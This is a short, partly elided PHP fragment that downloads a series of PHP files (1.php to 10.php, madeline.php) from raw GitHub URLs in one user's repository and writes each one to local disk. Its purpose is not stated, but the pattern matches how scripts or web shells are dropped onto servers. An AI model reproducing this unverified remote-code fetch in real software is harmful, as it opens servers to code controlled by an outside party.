...
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/1.php");
file_put_contents("1.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/2.php");
file_put_contents("2.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/3.php");
file_put_contents("3.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/4.php");
file_put_contents("4.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/5.php");
file_put_contents("5.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/6.php");
file_put_contents("6.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/7.php");
file_put_contents("7.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/8.php");
file_put_contents("8.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/9.php");
file_put_contents("9.php",$up_file);
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/10.php");
...
$up_file = curl_get("https://raw.githubusercontent.com/aRnoLD13/arnold/main/madeline.php");
